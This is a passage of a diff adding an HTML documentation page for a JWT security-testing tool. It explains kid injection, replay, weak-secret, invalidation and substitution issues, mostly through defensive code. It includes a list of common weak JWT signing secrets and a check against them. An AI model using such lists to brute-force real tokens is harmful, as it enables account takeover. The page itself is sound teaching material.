+                        <li>Use a whitelist of allowed key IDs</li>
+                        <li>Avoid using file paths directly in "kid" values</li>
+                        <li>Use parameterized queries for database lookups</li>
+                        <li>Implement proper input validation</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Secure kid validation
+function validateKid(kid) {
+    // Whitelist of allowed key IDs
+    const allowedKids = ['key1', 'key2', 'key3', 'production-key'];
+    
+    if (!allowedKids.includes(kid)) {
+        throw new Error('Invalid key ID');
+    }
+    
+    // Additional validation
+    if (kid.includes('..') || kid.includes('/') || kid.includes('\\')) {
+        throw new Error('Invalid key ID format');
+    }
+    
+    return kid;
+}
+
+// Usage
+try {
+    const header = jwt.decode(token, { complete: true }).header;
+    const validKid = validateKid(header.kid);
+    const key = getKeyById(validKid);
+    const decoded = jwt.verify(token, key);
+} catch (err) {
+    console.error('Token validation failed:', err.message);
+}</code></pre>
+                </div>
+
+                <div id="replay-attacks" class="docs-section">
+                    <h2>Replay Attacks</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        Replay attacks occur when an attacker captures a valid JWT and reuses it to gain unauthorized access. This is particularly dangerous when tokens have long expiration times or when there's no mechanism to track token usage.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <p>
+                        Replay attacks can lead to:
+                    </p>
+                    <ul>
+                        <li>Unauthorized access after user logout</li>
+                        <li>Session hijacking</li>
+                        <li>Persistent access even after password changes</li>
+                        <li>Abuse of privileged operations</li>
+                    </ul>
+                    
+                    <h3>Attack scenarios</h3>
+                    <ol>
+                        <li><strong>Network Interception</strong>: Attacker captures tokens from network traffic</li>
+                        <li><strong>XSS Attacks</strong>: Malicious scripts steal tokens from client storage</li>
+                        <li><strong>Log File Exposure</strong>: Tokens exposed in server logs or error messages</li>
+                        <li><strong>Shared Computer</strong>: Tokens left in browser storage on shared devices</li>
+                    </ol>
+                    
+                    <h3>How to fix it</h3>
+                    
+                    <h4>1. Short Token Expiration</h4>
+                    <ul>
+                        <li>Use short-lived access tokens (15-30 minutes)</li>
+                        <li>Implement refresh token rotation</li>
+                        <li>Force re-authentication for sensitive operations</li>
+                    </ul>
+                    
+                    <h4>2. Token Blacklisting</h4>
+                    <ul>
+                        <li>Maintain a blacklist of revoked tokens</li>
+                        <li>Check blacklist on each request</li>
+                        <li>Add tokens to blacklist on logout</li>
+                    </ul>
+                    
+                    <h4>3. Jti (JWT ID) Tracking</h4>
+                    <ul>
+                        <li>Include unique "jti" claim in each token</li>
+                        <li>Track used tokens to prevent replay</li>
+                        <li>Implement token revocation by jti</li>
+                    </ul>
+                    
+                    <h4>4. Additional Security Measures</h4>
+                    <ul>
+                        <li>Use HTTPS for all token transmissions</li>
+                        <li>Implement proper CORS policies</li>
+                        <li>Use HttpOnly cookies when possible</li>
+                        <li>Implement session binding</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Token blacklist implementation
+const blacklistedTokens = new Set();
+
+function blacklistToken(jti) {
+    blacklistedTokens.add(jti);
+    // Also store in database for persistence
+}
+
+function isTokenBlacklisted(jti) {
+    return blacklistedTokens.has(jti);
+}
+
+// Middleware to check blacklist
+function validateToken(req, res, next) {
+    try {
+        const token = req.headers.authorization?.split(' ')[1];
+        const decoded = jwt.verify(token, secretKey);
+        
+        if (isTokenBlacklisted(decoded.jti)) {
+            return res.status(401).json({ error: 'Token has been revoked' });
+        }
+        
+        req.user = decoded;
+        next();
+    } catch (err) {
+        res.status(401).json({ error: 'Invalid token' });
+    }
+}
+
+// Logout endpoint
+app.post('/logout', validateToken, (req, res) => {
+    blacklistToken(req.user.jti);
+    res.json({ message: 'Logged out successfully' });
+});</code></pre>
+                </div>
+
+                <div id="weak-secrets" class="docs-section">
+                    <h2>Weak Secrets</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        Many JWT implementations use weak or predictable secrets for HMAC signing. This makes them vulnerable to brute force attacks and dictionary attacks.
+                    </p>
+                    
+                    <h3>Common weak secrets</h3>
+                    <ul>
+                        <li>Default or example secrets from documentation</li>
+                        <li>Simple passwords or phrases</li>
+                        <li>Company names or product names</li>
+                        <li>Sequential or patterned strings</li>
+                        <li>Short secrets with low entropy</li>
+                    </ul>
+                    
+                    <h3>Examples of weak secrets</h3>
+                    <pre><code class="language-javascript">// VERY BAD: Common weak secrets
+const secrets = [
+    "secret",
+    "password",
+    "123456",
+    "your-256-bit-secret",
+    "mycompany",
+    "jwt-secret",
+    "supersecret",
+    "admin",
+    "key",
+    "token"
+];</code></pre>
+                    
+                    <h3>How to fix it</h3>
+                    
+                    <h4>1. Generate Strong Secrets</h4>
+                    <ul>
+                        <li>Use cryptographically secure random number generators</li>
+                        <li>Minimum 256 bits (32 bytes) for HS256</li>
+                        <li>Higher entropy for better security</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Generate strong secrets
+const crypto = require('crypto');
+
+// Generate a 256-bit secret
+const secret256 = crypto.randomBytes(32).toString('hex');
+
+// Generate a 512-bit secret
+const secret512 = crypto.randomBytes(64).toString('hex');
+
+// Using base64 encoding
+const secretBase64 = crypto.randomBytes(32).toString('base64');</code></pre>
+                    
+                    <h4>2. Use Asymmetric Algorithms</h4>
+                    <ul>
+                        <li>Consider using RS256 or ES256 instead of HS256</li>
+                        <li>Private key for signing, public key for verification</li>
+                        <li>Eliminates the need for shared secrets</li>
+                    </ul>
+                    
+                    <h4>3. Secret Management</h4>
+                    <ul>
+                        <li>Store secrets in environment variables</li>
+                        <li>Use key management services (AWS KMS, Azure Key Vault)</li>
+                        <li>Implement secret rotation</li>
+                        <li>Never hardcode secrets in source code</li>
+                    </ul>
+                    
+                    <pre><code class="language-javascript">// Secure secret management
+const secret = process.env.JWT_SECRET;
+
+if (!secret) {
+    throw new Error('JWT_SECRET environment variable is required');
+}
+
+if (secret.length < 32) {
+    throw new Error('JWT secret must be at least 32 characters long');
+}
+
+// Check for common weak secrets
+const weakSecrets = ['secret', 'password', '123456', 'your-256-bit-secret'];
+if (weakSecrets.includes(secret.toLowerCase())) {
+    throw new Error('Weak JWT secret detected');
+}</code></pre>
+                </div>
+
+                <div id="token-invalidation" class="docs-section">
+                    <h2>Token Invalidation Issues</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        Unlike session-based authentication, JWTs are stateless by design. This makes it challenging to invalidate tokens before their expiration time, leading to security issues when users log out, change passwords, or have their privileges revoked.
+                    </p>
+                    
+                    <h3>Why is it dangerous?</h3>
+                    <ul>
+                        <li>Tokens remain valid after user logout</li>
+                        <li>Compromised tokens can't be immediately revoked</li>
+                        <li>Privilege changes don't take effect until token expiration</li>
+                        <li>Terminated employees may retain access</li>
+                    </ul>
+                    
+                    <h3>Solutions</h3>
+                    
+                    <h4>1. Token Blacklisting</h4>
+                    <p>Maintain a blacklist of revoked tokens and check it on each request.</p>
+                    
+                    <pre><code class="language-javascript">// Redis-based token blacklist
+const redis = require('redis');
+const client = redis.createClient();
+
+async function blacklistToken(jti, exp) {
+    const ttl = exp - Math.floor(Date.now() / 1000);
+    await client.setex(`blacklist:${jti}`, ttl, 'revoked');
+}
+
+async function isTokenBlacklisted(jti) {
+    const result = await client.get(`blacklist:${jti}`);
+    return result === 'revoked';
+}
+
+// Middleware
+async function validateToken(req, res, next) {
+    try {
+        const token = req.headers.authorization?.split(' ')[1];
+        const decoded = jwt.verify(token, secretKey);
+        
+        if (await isTokenBlacklisted(decoded.jti)) {
+            return res.status(401).json({ error: 'Token revoked' });
+        }
+        
+        req.user = decoded;
+        next();
+    } catch (err) {
+        res.status(401).json({ error: 'Invalid token' });
+    }
+}</code></pre>
+                    
+                    <h4>2. Short-lived Tokens with Refresh</h4>
+                    <p>Use short-lived access tokens (15-30 minutes) with refresh tokens.</p>
+                    
+                    <pre><code class="language-javascript">// Refresh token implementation
+const refreshTokens = new Map(); // Use database in production
+
+function generateTokens(user) {
+    const accessToken = jwt.sign(
+        { sub: user.id, role: user.role },
+        secretKey,
+        { expiresIn: '15m' }
+    );
+    
+    const refreshToken = crypto.randomBytes(32).toString('hex');
+    refreshTokens.set(refreshToken, user.id);
+    
+    return { accessToken, refreshToken };
+}
+
+app.post('/refresh', async (req, res) => {
+    const { refreshToken } = req.body;
+    
+    if (!refreshTokens.has(refreshToken)) {
+        return res.status(401).json({ error: 'Invalid refresh token' });
+    }
+    
+    const userId = refreshTokens.get(refreshToken);
+    const user = await getUserById(userId);
+    
+    // Generate new tokens
+    const tokens = generateTokens(user);
+    
+    // Revoke old refresh token
+    refreshTokens.delete(refreshToken);
+    
+    res.json(tokens);
+});</code></pre>
+                    
+                    <h4>3. Version-based Invalidation</h4>
+                    <p>Include a version number in tokens and increment it when invalidation is needed.</p>
+                    
+                    <pre><code class="language-javascript">// Version-based invalidation
+const userTokenVersions = new Map();
+
+function generateToken(user) {
+    const version = userTokenVersions.get(user.id) || 0;
+    
+    return jwt.sign(
+        { 
+            sub: user.id, 
+            role: user.role,
+            version: version
+        },
+        secretKey,
+        { expiresIn: '1h' }
+    );
+}
+
+function invalidateUserTokens(userId) {
+    const currentVersion = userTokenVersions.get(userId) || 0;
+    userTokenVersions.set(userId, currentVersion + 1);
+}
+
+// Middleware
+function validateToken(req, res, next) {
+    try {
+        const token = req.headers.authorization?.split(' ')[1];
+        const decoded = jwt.verify(token, secretKey);
+        
+        const currentVersion = userTokenVersions.get(decoded.sub) || 0;
+        if (decoded.version < currentVersion) {
+            return res.status(401).json({ error: 'Token version mismatch' });
+        }
+        
+        req.user = decoded;
+        next();
+    } catch (err) {
+        res.status(401).json({ error: 'Invalid token' });
+    }
+}</code></pre>
+                </div>
+
+                <div id="token-substitution" class="docs-section">
+                    <h2>Token Substitution Attacks</h2>
+                    
+                    <h3>What is this issue?</h3>
+                    <p>
+                        Token substitution attacks occur when an attacker uses a token intended for one context in a different context. This can happen when tokens lack proper audience validation or when the same token is used across multiple services.
+                    </p>
+                    
+                    <h3>Types of substitution attacks</h3>
+                    
+                    <h4>1. Cross-Service Token Reuse</h4>
+                    <p>Using a token issued for Service A to access Service B</p>
+                    
+                    <h4>2. Privilege Escalation</h4>
+                    <p>Using a token with limited scope in a context requiring higher privileges</p>
+                    
+                    <h4>3. Cross-Domain Attacks</h4>
+                    <p>Using tokens across different domains or applications</p>
+                    
+                    <h3>How to fix it</h3>
+                    
+                    <h4>1. Audience Validation</h4>
+                    <p>Always include and validate the audience (aud) claim</p>
+                    
+                    <pre><code class="language-javascript">// Service-specific token validation
+function validateToken(token, expectedAudience) {
+    try {
+        const decoded = jwt.verify(token, secretKey, {
+            audience: expectedAudience,
+            issuer: 'trusted-auth-server'
+        });
+        return decoded;
+    } catch (err) {
+        throw new Error('Token validation failed');
+    }
+}
+
+// Usage in different services
+// Service A
+const userServiceToken = validateToken(token, 'user-service');
+
+// Service B  
+const paymentServiceToken = validateToken(token, 'payment-service');</code></pre>
+                    
+                    <h4>2. Scope-based Authorization</h4>
+                    <p>Include specific scopes in tokens and validate them</p>
+                    
+                    <pre><code class="language-javascript">// Scope-based token
+const token = jwt.sign({
+    sub: user.id,
+    aud: 'payment-service',
+    scope: ['read:payments', 'write:payments'],
+    exp: Math.floor(Date.now() / 1000) + 3600
+}, secretKey);
+
+// Scope validation middleware
+function requireScope(requiredScope) {
+    return (req, res, next) => {
+        const token = req.headers.authorization?.split(' ')[1];
+        
+        try {
+            const decoded = jwt.verify(token, secretKey);
+            
+            if (!decoded.scope || !decoded.scope.includes(requiredScope)) {
+                return res.status(403).json({ error: 'Insufficient scope' });
+            }
+            
+            req.user = decoded;
+            next();
+        } catch (err) {
+            res.status(401).json({ error: 'Invalid token' });
+        }
+    };
+}
+
+// Usage
+app.get('/payments', requireScope('read:payments'), (req, res) => {
+    // Handle payment reading
+});
+
+app.post('/payments', requireScope('write:payments'), (req, res) => {
+    // Handle payment creation
+});</code></pre>
+                    
+                    <h4>3. Context-Specific Tokens</h4>
+                    <p>Generate different tokens for different contexts</p>
+                    
+                    <pre><code class="language-javascript">// Context-specific token generation
+function generateContextToken(user, context) {
+    const basePayload = {
+        sub: user.id,
+        iat: Math.floor(Date.now() / 1000),
+        exp: Math.floor(Date.now() / 1000) + 3600
+    };
+    
+    switch (context) {
+        case 'admin':
+            return jwt.sign({
+                ...basePayload,
+                aud: 'admin-panel',
+                role: 'admin',
+                scope: ['admin:read', 'admin:write']
+            }, secretKey);
+            
+        case 'api':
+            return jwt.sign({
+                ...basePayload,
+                aud: 'api-service',
+                role: user.role,
+                scope: getUserScopes(user)
+            }, secretKey);
+            
+        case 'mobile':
+            return jwt.sign({
+                ...basePayload,
+                aud: 'mobile-app',
+                role: user.role,
+                device: 'mobile'
+            }, secretKey);
+            
+        default:
+            throw new Error('Invalid context');
+    }
+}</code></pre>
+                </div>
+
+                <div class="docs-section">
+                    <h2>JSON Web Encryption (JWE)</h2>
+                    
+                    <h3>What is JWE?</h3>
+                    <p>
+                        JSON Web Encryption (JWE) is a standard for encrypting JWT payloads to ensure confidentiality. Unlike JWS (JSON Web Signature) which only provides integrity and authenticity, JWE encrypts the payload so that only authorized parties can read it.
+                    </p>
+                    
+                    <h3>When to use JWE</h3>
+                    <ul>
+                        <li>When JWT payload contains sensitive information</li>
+                        <li>Compliance requirements (GDPR, HIPAA, etc.)</li>
+                        <li>Additional layer of security for critical applications</li>
+                        <li>When tokens are transmitted through untrusted channels</li>
+                    </ul>
+                    
+                    <h3>JWE Structure</h3>
+                    <p>JWE consists of five parts separated by dots:</p>
+                    <pre><code class="language-text">BASE64URL(UTF8(JWE Protected Header)) + '.' +
+BASE64URL(JWE Encrypted Key) + '.' +
+BASE64URL(JWE Initialization Vector) + '.' +
+BASE64URL(JWE Ciphertext) + '.' +
+BASE64URL(JWE Authentication Tag)</code></pre>
+                    
+                    <h3>JWE Implementation Example</h3>
+                    <pre><code class="language-javascript">// Node.js JWE implementation using jose library
+const { EncryptJWT, jwtDecrypt } = require('jose');
+const crypto = require('crypto');
+
+// Generate a symmetric key
+const secret = crypto.randomBytes(32);
+
+// Create an encrypted JWT
+async function createJWE(payload) {
+    const jwt = await new EncryptJWT(payload)
+        .setProtectedHeader({ alg: 'A256KW', enc: 'A256GCM' })
+        .setIssuedAt()
+        .setExpirationTime('2h')
+        .encrypt(secret);
+    
+    return jwt;
+}
+
+// Decrypt and verify JWE
+async function verifyJWE(jwe) {
+    const { payload, protectedHeader } = await jwtDecrypt(jwe, secret);
+    return payload;
+}
+
+// Usage
+async function example() {
+    const sensitivePayload = {
+        sub: 'user123',
+        ssn: '123-45-6789',
+        salary: 75000,
+        role: 'admin'
+    };
+    
+    // Create encrypted JWT
+    const jwe = await createJWE(sensitivePayload);
+    console.log('Encrypted JWT:', jwe);
+    
+    // Decrypt and verify
+    const decrypted = await verifyJWE(jwe);
+    console.log('Decrypted payload:', decrypted);
+}</code></pre>
+                    
+                    <h3>JWE vs JWS Comparison</h3>
+                    <div class="table-responsive">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Feature</th>
+                                    <th>JWS (JSON Web Signature)</th>
+                                    <th>JWE (JSON Web Encryption)</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Purpose</td>
+                                    <td>Integrity and authenticity</td>
+                                    <td>Confidentiality</td>
+                                </tr>
+                                <tr>
+                                    <td>Payload Visibility</td>
+                                    <td>Visible (Base64 encoded)</td>
+                                    <td>Encrypted (not visible)</td>
+                                </tr>
+                                <tr>
+                                    <td>Performance</td>
+                                    <td>Faster</td>
+                                    <td>Slower (encryption overhead)</td>
+                                </tr>
+                                <tr>
+                                    <td>Size</td>
+                                    <td>Smaller</td>
+                                    <td>Larger (encryption metadata)</td>
+                                </tr>
+                                <tr>
+                                    <td>Use Case</td>
+                                    <td>Standard authentication</td>
+                                    <td>Sensitive data transmission</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="docs-section">
+                    <h2>Additional Resources</h2>
+                    
+                    <ul class="resource-list">
+                        <li>
+                            <a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" class="resource-link">
+                                <i class="fas fa-file-alt"></i>
+                                <div>
+                                    <h4>Critical Vulnerabilities in JSON Web Token Libraries</h4>
+                                    <p>Auth0's research on critical JWT vulnerabilities</p>
+                                </div>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://github.com/ticarpi/jwt_tool/wiki" target="_blank" class="resource-link">
+                                <i class="fas fa-tools"></i>
+                                <div>
+                                    <h4>JWT Attack Playbook</h4>
+                                    <p>Comprehensive guide to JWT attacks and techniques</p>
+                                </div>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://portswigger.net/web-security/jwt" target="_blank" class="resource-link">
+                                <i class="fas fa-graduation-cap"></i>
+                                <div>
+                                    <h4>PortSwigger Web Security Academy: JWT Attacks</h4>
+                                    <p>Interactive labs and tutorials on JWT vulnerabilities</p>
+                                </div>
+                            </a>
+                        </li>
+                    </ul>
+                    
+                    <div class="next-steps">
+                        <h3>Next Steps</h3>
+                        <div class="next-links">
+                            <a href="secure-jwt-implementation.html" class="next-link">
+                                <i class="fas fa-lock"></i>
+                                <span>Learn Secure Implementation</span>
+                            </a>
+                            <a href="tool-guides/decoder-analyzer.html" class="next-link">
+                                <i class="fas fa-search"></i>
+                                <span>Try JWT Analyzer Tool</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-container">
+            <div class="footer-section">
+                <h3>JWTAuditor</h3>
+                <p>Professional JWT security testing platform for penetration testers and cybersecurity professionals. Decode, analyze vulnerabilities, and audit JSON Web Token implementations with complete client-side privacy.</p>
+            </div>
+            <div class="footer-section">
+                <h3>Documentation</h3>
+                <ul class="footer-links">
+                    <li><a href="jwt-fundamentals.html">JWT Fundamentals</a></li>
+                    <li><a href="jwt-vulnerabilities-guide.html">Vulnerabilities Guide</a></li>
+                    <li><a href="secure-jwt-implementation.html">Secure Implementation</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h3>Resources</h3>
+                <ul class="footer-links">
+                    <li><a href="../about.html">About Us</a></li>
+                    <li><a href="https://jwt.io/" target="_blank">JWT.io</a></li>
+                    <li><a href="https://portswigger.net/web-security/jwt" target="_blank">PortSwigger JWT Attacks</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+<p>&copy; 2025 A Project by 
+  <a href="https://github.com/dr34mhacks" style="color: var(--primary-color);">Sid</a> & 
+  <a href="https://github.com/thecybersandeep" style="color: var(--primary-color);">Sandeep</a> • 
+  Backed by <a href="https://infosecmania.com" target="_blank" style="color: var(--primary-color);">Infosecmania.com</a>
+</p>            <div class="social-links">
+                <a href="https://x.com/infosecmania" target="_blank"><i class="fab fa-twitter"></i></a>
+                <a href="https://www.linkedin.com/company/infosecmania" target="_blank"><i class="fab fa-linkedin"></i></a>
+                <a href="https://github.com/dr34mhacks/jwtauditor" target="_blank"><i class="fab fa-github"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <button class="sidebar-toggle" aria-label="Toggle sidebar">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <button class="scroll-to-top" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script src="js/docs.js"></script>
+    <script>
+        // Scroll to top functionality
+        const scrollToTopBtn = document.querySelector('.scroll-to-top');
+        
+        window.addEventListener('scroll', () => {
+            if (window.pageYOffset > 300) {
+                scrollToTopBtn.classList.add('visible');
+            } else {
+                scrollToTopBtn.classList.remove('visible');
+            }
+        });
+        
+        scrollToTopBtn.addEventListener('click', () => {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+    </script>
+</body>
+</html>
